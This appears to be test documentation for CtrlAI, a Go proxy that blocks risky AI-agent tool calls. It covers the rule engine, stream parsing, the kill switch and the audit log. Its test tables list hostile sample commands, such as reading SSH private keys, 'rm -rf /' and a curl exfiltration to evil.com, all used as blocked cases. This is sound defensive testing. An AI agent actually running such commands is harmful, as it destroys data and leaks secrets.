# CtrlAI v1 — Test Documentation

This document covers the complete test suite for CtrlAI v1: what's tested, why, and what the integration tests verified at the system level.

**Total: 155 unit tests + 22 integration tests (manual CLI verification)**

All tests pass on Go 1.24 / Windows 11.

```bash
go test ./... -count=1
```

---

## Unit Tests by Package

### 1. Rule Engine (`internal/engine/`) — 30 tests

The rule engine is the core of CtrlAI. It evaluates every tool call against the rule set and decides allow/block. These tests verify all matching logic, builtin rules, CRUD operations, and persistence.

| Test | What It Verifies |
|------|------------------|
| `TestEvaluate_DefaultAllow` | No rules matched → action is "allow" with empty rule name |
| `TestEvaluate_ToolNameCaseInsensitive` | Tool matching works with `exec`, `Exec`, `EXEC`, `ExEc` (OAuth PascalCase handling) |
| `TestEvaluate_ToolNameORLogic` | `tool: [exec, read]` matches either tool, doesn't match unlisted tools like `write` |
| `TestEvaluate_AgentExactMatch` | Rule with `agent: agent-x` only matches that agent, not `agent-y` |
| `TestEvaluate_ActionMatch` | `action: [camera_snap, camera_clip]` matches nodes tool actions, case-insensitive |
| `TestEvaluate_ArgContains` | `arg_contains: ".ssh/id_"` matches `.ssh/id_ed25519` and `.SSH/ID_RSA` (case-insensitive) |
| `TestEvaluate_CommandRegex` | Regex matching on exec command: blocks `rm -rf /`, `mkfs`, `dd if=`, curl exfil. Allows safe `ls`, `rm file.txt`, `curl api.example.com` |
| `TestEvaluate_URLRegex` | Regex on `url` and `targetUrl` fields. Blocks `evil.com`, allows `good.com` |
| `TestEvaluate_PathGlob` | Glob matching: `**/.env` blocks `/app/project/.env`, allows `/app/project/config.json` |
| `TestEvaluate_ANDLogicAcrossFields` | Rule with `tool + agent + command_regex` requires ALL fields to match. Wrong agent, wrong command, or wrong tool → no match |
| `TestBuiltinRules` | 10 subtests verifying all built-in rule categories: SSH keys, shell configs (.bashrc, .zshrc, .profile), camera, message admin, gateway, self-modification, safe exec, safe read |
| `TestBuiltinToggle_Disabled` | Setting `block_ssh_private_keys: false` in rules.yaml disables that rule while others remain active |
| `TestAddRule` | Adding a custom rule via YAML string, verifying it matches |
| `TestAddRule_NoName` | Rule without a name → error |
| `TestAddRule_DefaultsToBlock` | Rule with no `action` field defaults to block |
| `TestRemoveRule` | Remove a custom rule, verify it no longer matches |
| `TestRemoveRule_NotFound` | Removing nonexistent rule → error |
| `TestTestJSON` | `TestJSON()` API: parses tool call JSON and evaluates against rules |
| `TestTestJSON_Invalid` | Invalid JSON → error |
| `TestEngineCountsAndList` | `TotalRules()`, `BuiltinCount()`, `CustomCount()`, `ListRules()` return consistent values |
| `TestSaveAndReload` | Save rules to YAML, load into new engine, verify custom rules persist |
| `TestFirstMatchWins` | Two custom rules where first matches → second never evaluated |
| `TestGetStringArg` | Helper function: extracts string values from argument maps, handles missing/non-string/nil |
| `TestStringOrList_Unmarshal` | YAML field `tool: exec` (single string) unmarshals correctly alongside list form `tool: [exec, read]` |

**Why these matter:** The engine is the security boundary. A bug here means blocked tool calls get through. The case-insensitivity test is critical because OAuth tokens cause PascalCase tool names (`Bash` vs `bash`).

---

### 2. Tool Call Extractor (`internal/extractor/`) — 18 tests

The extractor parses LLM responses (Anthropic and OpenAI formats) to find tool calls. If extraction fails, tool calls pass through unblocked.

| Test | What It Verifies |
|------|------------------|
| `TestExtractAnthropic_SingleToolUse` | Extracts ID, Name, Index, Arguments, RawJSON from a single tool_use block |
| `TestExtractAnthropic_ThinkingTextToolUse` | Correctly indexes tool_use at position 2 (after thinking + text blocks) |
| `TestExtractAnthropic_MultipleToolUse` | Extracts 2 tool calls with correct indexes (1 and 2, after text at 0) |
| `TestExtractAnthropic_NoToolUse` | Text-only response → 0 tool calls extracted |
| `TestExtractAnthropic_EmptyContent` | Empty content array → 0 tool calls |
| `TestExtractAnthropic_MalformedJSON` | Invalid JSON → nil (no panic) |
| `TestExtractAnthropic_NestedArguments` | Tool with nested JSON arguments extracts correctly |
| `TestExtractOpenAI_SingleToolCall` | Extracts ID, Name, Index from `choices[0].message.tool_calls[0]` |
| `TestExtractOpenAI_MultipleToolCalls` | Extracts 2 tool calls with correct indexes |
| `TestExtractOpenAI_NoToolCalls` | Content-only response → 0 tool calls |
| `TestExtractOpenAI_EmptyChoices` | Empty choices array → nil |
| `TestExtractOpenAI_MalformedJSON` | Invalid JSON → nil (no panic) |
| `TestExtract_Dispatch` | `Extract()` dispatches to correct parser based on APIType. Unknown type → nil |
| `TestExtractRequestMeta_Anthropic` | Extracts model, stream flag, tool names from Anthropic request body |
| `TestExtractRequestMeta_OpenAI` | Extracts model, stream flag, tool names from OpenAI request body (nested `function.name` format) |
| `TestExtractRequestMeta_Empty` | Empty JSON body → zero values |
| `TestExtractRequestMeta_Malformed` | Invalid JSON → zero values (no panic) |

**Why these matter:** Extraction must handle both API formats correctly. The index tracking is critical — wrong indexes mean the wrong tool call gets blocked in response modification.

---

### 3. URL Router (`internal/proxy/`) — 16 tests

The router parses incoming URLs to determine provider, agent ID, API path, and API type.

| Test | What It Verifies |
|------|------------------|
| `TestParseRoute` — anthropic with agent | `/provider/anthropic/agent/main/v1/messages` → provider=anthropic, agent=main, apiPath=/v1/messages, type=Anthropic |
| `TestParseRoute` — openai with agent | `/provider/openai/agent/work/v1/chat/completions` → correct OpenAI routing |
| `TestParseRoute` — anthropic without agent | `/provider/anthropic/v1/messages` → agent defaults to "default" |
| `TestParseRoute` — openai responses API | `/provider/openai/v1/responses` → detected as OpenAI |
| `TestParseRoute` — unknown API type | `/provider/custom/agent/bot/v1/something` → APITypeUnknown (pass-through) |
| `TestParseRoute` — no provider prefix | `/invalid/path` → error |
| `TestParseRoute` — empty path | Empty string → error |
| `TestParseRoute` — root only | `/` → error |
| `TestParseRoute` — provider key only | `/provider/anthropic` → valid with empty APIPath |
| `TestDetectAPIType` — /v1/messages | → Anthropic |
| `TestDetectAPIType` — /v1/messages?beta=true | → Anthropic (query params ignored) |
| `TestDetectAPIType` — /v1/chat/completions | → OpenAI |
| `TestDetectAPIType` — /v1/responses | → OpenAI |
| `TestDetectAPIType` — /v1/embeddings | → Unknown |
| `TestDetectAPIType` — /v2/messages | → Unknown (wrong version prefix) |
| `TestDetectAPIType` — empty | → Unknown |

**Why these matter:** Routing determines which upstream provider gets the request and which API format is used for response parsing. Wrong detection = wrong response modification = broken SDK.

---

### 4. Response Modifier (`internal/proxy/`) — 10 tests

Response modification is where blocked tool calls are stripped and replaced with block notices.

| Test | What It Verifies |
|------|------------------|
| `TestModifyAnthropicResponse_SingleBlock` | Strips tool_use, changes stop_reason to end_turn, injects block notice text |
| `TestModifyAnthropicResponse_PartialBlock` | 2 tool_use blocks, 1 blocked → keeps allowed one, stop_reason stays "tool_use" |
| `TestModifyAnthropicResponse_PreservesThinking` | Thinking block with signature passes through unchanged when tool_use is stripped |
| `TestModifyOpenAIResponse_SingleBlock` | Strips tool_calls, changes finish_reason to "stop", appends notice to content |
| `TestModifyOpenAIResponse_PartialBlock` | Partial block → finish_reason stays "tool_calls" |
| `TestBuildKilledResponse_Anthropic` | Kill switch fake response has stop_reason="end_turn" |
| `TestBuildKilledResponse_OpenAI` | Kill switch fake response has finish_reason="stop" |
| `TestBuildKilledResponse_Unknown` | Unknown API type → error response |
| `TestFormatBlockNotice` — with message and rule | `[CtrlAI] Blocked: Bad command (rule: my_rule)` |
| `TestFormatBlockNotice` — empty message | Falls back to `Tool call 'exec' was blocked` |
| `TestFormatBlockNotice` — empty rule | Omits rule suffix |

**Why these matter:** If stop_reason isn't changed correctly, the SDK enters an undefined state (tool_use with no tool_use blocks). Thinking blocks MUST be preserved — stripping the signature breaks Claude's verification.

---

### 5. SSE Parser (`internal/proxy/`) — 8 tests

The SSE parser reads Server-Sent Events from the LLM's streaming response.

| Test | What It Verifies |
|------|------------------|
| `TestParseSSEStream_AnthropicFormat` | Parses `event: type\ndata: json\n\n` format correctly (6 events) |
| `TestParseSSEStream_OpenAIFormat` | Parses `data: json\n\n` format (no event line), detects [DONE] |
| `TestParseSSEStream_SkipsPing` | `event: ping` is dropped (Anthropic keep-alive) |
| `TestParseSSEStream_TerminatesAtMessageStop` | Stops reading after `message_stop` (Anthropic), ignores trailing events |
| `TestParseSSEStream_TerminatesAtDONE` | Stops reading after `[DONE]` (OpenAI), ignores trailing events |
| `TestParseSSEStream_MultiLineData` | Multiple `data:` lines concatenated with `\n` |
| `TestParseSSEStream_IgnoresComments` | Lines starting with `:` are SSE comments, skipped |
| `TestParseSSEStream_EmptyStream` | Empty input → 0 events, no error |

**Why these matter:** SSE parsing is the foundation of streaming interception. Failing to detect `message_stop` means infinite buffering. Failing to skip pings pollutes the event buffer.

---

### 6. SSE Writer (`internal/proxy/`) — 14 tests

The SSE writer builds modified streaming responses when tool calls are blocked.

| Test | What It Verifies |
|------|------------------|
| `TestBuildModifiedAnthropicStream_AllBlocked` | Strips tool_use events, changes stop_reason to end_turn, injects block notice |
| `TestBuildModifiedAnthropicStream_TextPreserved` | Original text content "Hello" passes through in modified stream |
| `TestBuildModifiedAnthropicStream_ReindexesBlocks` | text@0, blocked_tool@1, allowed_tool@2 → after stripping: text@0, allowed_tool@1 (reindexed) |
| `TestBuildModifiedOpenAIStream_AllBlocked` | Changes finish_reason to "stop" |
| `TestAllToolsBlocked_Anthropic` — all blocked | Index 1 blocked → returns true |
| `TestAllToolsBlocked_Anthropic` — not all blocked | Wrong index blocked → returns false |
| `TestAllToolsBlocked_Anthropic` — no tool_use | No tool events → vacuously true |
| `TestAllOpenAIToolsBlocked` — all blocked | Index 0 blocked → returns true |
| `TestAllOpenAIToolsBlocked` — not all blocked | Wrong index → returns false |
| `TestAllOpenAIToolsBlocked` — no tool calls | Content-only events → returns false |
| `TestBuildBlockNoticeText` — single | Single message passed through directly |
| `TestBuildBlockNoticeText` — multiple | Multiple messages combined |

**Why these matter:** Re-indexing is critical. The Anthropic SDK expects contiguous block indexes (0, 1, 2, ...). A gap (0, 2) causes parsing failures. The `allToolsBlocked` function determines whether to change stop_reason — the old version had a critical bug that always returned true.

---

### 7. SSE Reconstruction (`internal/proxy/`) — 8 tests

Reconstruction builds a full message from buffered SSE events for rule evaluation.

| Test | What It Verifies |
|------|------------------|
| `TestReconstructAnthropic_FullStream` | Full stream with thinking + text + tool_use → 3 content blocks, 1 tool call, correct stop_reason |
| `TestReconstructAnthropic_FullStream` — thinking | Thinking text and signature correctly accumulated from delta events |
| `TestReconstructAnthropic_FullStream` — tool args | Partial JSON deltas `{"command":` + `"ls -la"}` reassembled into `{"command": "ls -la"}` |
| `TestReconstructAnthropic_TextOnly` | No tool calls extracted, stop_reason = "end_turn" |
| `TestReconstructAnthropic_Empty` | nil events → empty blocks, empty tool calls |
| `TestReconstructOpenAI_ToolCalls` | Accumulates function name and argument fragments across multiple delta chunks |
| `TestReconstructOpenAI_MultipleToolCalls` | Two tool calls at different indexes both extracted |
| `TestReconstructOpenAI_ContentOnly` | Content-only stream → 0 tool calls, stop_reason = "stop" |
| `TestReconstructOpenAI_Empty` | nil events → 0 tool calls |

**Why these matter:** Reconstruction is how we turn a stream of incremental SSE deltas back into a complete message for rule evaluation. If partial JSON isn't correctly reassembled, tool arguments are incomplete and rules can't match.

---

### 8. Audit Log (`internal/audit/`) — 7 tests

The audit log uses a hash chain for tamper detection.

| Test | What It Verifies |
|------|------------------|
| `TestComputeHash_Deterministic` | Same input → same SHA-256 hash, prefixed with "sha256:" |
| `TestComputeHash_DifferentEntries` | Different seq numbers → different hashes |
| `TestComputeHash_SensitiveToAllFields` | Changing ANY of seq, timestamp, agent, tool, decision, prev_hash produces a different hash (6 subtests) |
| `TestVerifyEntry_Valid` | Entry with correctly computed hash → verifies true |
| `TestVerifyEntry_TamperedHash` | Entry with wrong hash → verifies false |
| `TestVerifyEntry_TamperedField` | Entry modified AFTER hash computed → verifies false |
| `TestHashChain_Integrity` | 3-entry chain: genesis → e1 → e2. All verify individually. Tampering e2.Agent breaks e2 verification. Chain linkage via prev_hash is correct |

**Why these matter:** The hash chain is the audit trail's tamper-evidence mechanism. If someone modifies a log entry (e.g., changes "block" to "allow"), the chain breaks.

---

### 9. Config (`internal/config/`) — 6 tests

Config loading, validation, and default generation.

| Test | What It Verifies |
|------|------------------|
| `TestLoad_NonexistentFile` | Missing file → default config (host=127.0.0.1, port=3100, buffer=true, 2 providers) |
| `TestLoad_ValidYAML` | Full YAML → all fields parsed correctly |
| `TestLoad_InvalidYAML` | Malformed YAML → error |
| `TestLoad_PartialOverride` | Only `port: 9090` specified → port overridden, host retains default |
| `TestValidate` | 6 subtests: valid config passes, empty host/port 0/port 65536/empty upstream/negative timeout all fail |
| `TestWriteDefault_Roundtrip` | Write default → load back → values match |

---

### 10. Agent Management (`internal/agent/`) — 19 tests

Kill switch and agent registry.

**Kill Switch (9 tests):**

| Test | What It Verifies |
|------|------------------|
| `TestNewKillSwitch_NonexistentFile` | No file → no agents killed |
| `TestNewKillSwitch_LoadExisting` | Pre-existing killed.yaml → agent loaded as killed |
| `TestKillSwitch_Kill` | Kill agent1 → IsKilled returns true for agent1, false for agent2 |
| `TestKillSwitch_KillIdempotent` | Killing already-killed agent → no error |
| `TestKillSwitch_Revive` | Kill then revive → IsKilled returns false |
| `TestKillSwitch_ReviveNonKilled` | Reviving never-killed agent → no error |
| `TestKillSwitch_PersistsToFile` | Kill writes to disk, new KillSwitch loads it |
| `TestKillSwitch_RevivePersists` | Revive persists — new KillSwitch sees agent as not killed |
| `TestKillSwitch_Reload` | External file modification detected on Reload() |

**Agent Registry (10 tests):**

| Test | What It Verifies |
|------|------------------|
| `TestNewRegistry_NonexistentFile` | No file → empty registry |
| `TestRegistry_Touch_AutoRegisters` | First Touch() creates agent with status=active, correct provider/model, stats.total_requests=1 |
| `TestRegistry_Touch_UpdatesExisting` | Second Touch() increments total_requests, updates model |
| `TestRegistry_Get_NotFound` | Getting nonexistent agent → error |
| `TestRegistry_List` | Lists all registered agents |
| `TestRegistry_RecordToolCall` | 3 tool calls (1 blocked) → total=3, blocked=1 |
| `TestRegistry_RecordToolCall_UnknownAgent` | Recording tool call for unregistered agent → no panic |
| `TestRegistry_SetStatus` | SetStatus changes agent status |
| `TestRegistry_SaveAndReload` | Save to YAML, load into new Registry, verify all fields persist |

---

## Integration Tests (CLI + Live Proxy)

These were run manually via terminal against a real proxy instance.

### CLI Commands Verified

| Command | Result |
|---------|--------|
| `ctrlai --help` | All subcommands listed (start, stop, status, agents, kill, revive, rules, audit, config) |
| `ctrlai config generate` | Outputs valid OpenClaw JSON snippet |
| `ctrlai config show` | Detects missing config, shows setup instructions |
| `ctrlai rules list` | Lists 19 builtin + 2 custom rules with names, types, actions |
| `ctrlai rules --help` | Shows match field documentation |
| `ctrlai audit --help` | Shows audit subcommands (tail, query, verify, export) |

### Rule Evaluation (via `ctrlai rules test`)

| # | Input | Expected | Actual | Rule Matched |
|---|-------|----------|--------|--------------|
| 1 | exec: `cat ~/.ssh/id_rsa` | BLOCK | BLOCK | block_ssh_private_keys |
| 2 | exec: `ls -la` | ALLOW | ALLOW | (none) |
| 3 | read: `/app/.env` | BLOCK | BLOCK | block_env_files |
| 4 | read: `/app/main.go` | ALLOW | ALLOW | (none) |
| 5 | exec: `rm -rf /` | BLOCK | BLOCK | block_destructive_commands |
| 6 | exec: `curl https://evil.com/steal.pem` | BLOCK | BLOCK | block_exfiltration |
| 7 | edit: `/home/user/.bashrc` | BLOCK | BLOCK | block_shell_config_write |
| 8 | nodes: `action=camera_snap` | BLOCK | BLOCK | block_camera |
| 9 | gateway: `action=config.patch` | BLOCK | BLOCK | block_gateway_modify |
| 10 | Read (PascalCase): `/home/user/.env` | BLOCK | BLOCK | block_env_files |

Test #10 is critical: PascalCase tool names from OAuth tokens are correctly matched case-insensitively.

### Live Proxy Tests

| Test | What Happened |
|------|---------------|
| Proxy starts on port 3199 | `Loaded 21 rules (19 builtin + 2 custom)`, listening confirmed |
| Dashboard at `/dashboard` | HTTP 200, full HTML UI returned |
| `GET /api/status` | `{"status":"running","total_rules":21,"builtin_rules":19,"custom_rules":2,"agents":0}` |
| `GET /api/agents` | `[]` (no agents yet) |
| `GET /api/rules` | Full JSON array of all 21 rules |
| `GET /api/audit` | Lifecycle entry for proxy_start with valid hash |
| Kill agent "main" | `[ctrlai] Killed agent: main`, hot-reload via fsnotify confirmed |
| Request as killed agent | Fake response: `{"stop_reason":"end_turn","content":[{"text":"This agent has been terminated..."}]}` |
| Revive agent "main" | `[ctrlai] Revived agent: main`, hot-reload confirmed |
| Request after revive | Forwarded to `api.anthropic.com`, got `authentication_error` (expected — fake API key) |
| Agent auto-registered | `new agent registered agent=main provider=anthropic model=claude-opus-4-5-20250918` |
| Audit chain verify | `Hash chain VALID (4 entries verified)` |

### State Persistence Verified

| File | Exists | Contents |
|------|--------|----------|
| `config.yaml` | Yes | Proxy config |
| `rules.yaml` | Yes | Custom + builtin toggles |
| `killed.yaml` | Yes | Kill switch state |
| `ctrlai.pid` | Yes | Proxy PID |
| `audit/genesis.json` | Yes | Chain root hash |
| `audit/2026-02-13.jsonl` | Yes | Daily audit entries |
| `audit/index.db` | Yes | SQLite query index |

---

## What's NOT Tested (and Why)

| Area | Reason |
|------|--------|
| End-to-end with real LLM tool calls | Requires valid API key + LLM returning tool_use. Covered by unit tests on response modification |
| Dashboard WebSocket live feed | Requires browser/ws client. Architecture verified by code review (hub pattern) |
| Concurrent proxy requests | Thread safety verified by code review (RWMutex on all shared state). Stress test recommended before production |
| TLS/HTTPS upstream | Transparent — Go's http.Client handles TLS. No custom code to test |
| Daemon mode (`ctrlai start -d`) | Platform-specific process forking. Manual test recommended |
| Hot reload of config.yaml | fsnotify-based. Verified for killed.yaml; same mechanism for config |

---

## Running Tests

```bash
# All tests
go test ./... -v

# Specific package
go test ./internal/engine/ -v

# With race detection (recommended before release)
go test -race ./...

# With coverage
go test -coverprofile=coverage.out ./...
go tool cover -html=coverage.out
```
